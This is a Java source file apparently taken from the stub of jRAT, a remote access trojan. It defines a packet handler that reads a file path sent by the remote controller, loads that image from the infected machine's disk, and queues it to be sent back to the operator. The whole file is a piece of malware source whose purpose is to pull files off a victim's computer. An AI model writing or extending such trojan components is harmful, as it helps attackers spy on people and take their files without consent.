package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet43PreviewImage;
import java.awt.image.BufferedImage;
import java.io.File;
import javax.imageio.ImageIO;

public class Packet62PreviewImage extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = con.readLine();

		BufferedImage image = ImageIO.read(new File(file));

		con.addToSendQueue(new Packet43PreviewImage(image));
	}

}
